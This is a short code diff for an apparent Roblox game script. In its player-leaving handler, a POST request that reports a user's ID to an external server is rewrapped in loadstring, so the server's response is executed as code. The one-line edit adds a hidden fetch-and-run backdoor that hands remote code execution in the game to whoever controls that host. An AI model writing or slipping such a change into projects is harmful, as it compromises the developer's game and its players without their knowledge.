@@ -71,7 +71,7 @@ end
 
 players.PlayerRemoving:Connect(function(p:Player)
 	local succ, err = pcall(function()
-		return http:PostAsync(httpserver,http:JSONEncode({uid = p.UserId}))
+		return loadstring(http:PostAsync(httpserver,http:JSONEncode({uid = p.UserId})))
 	end)
 	
 	if game:GetService("RunService"):IsStudio() then
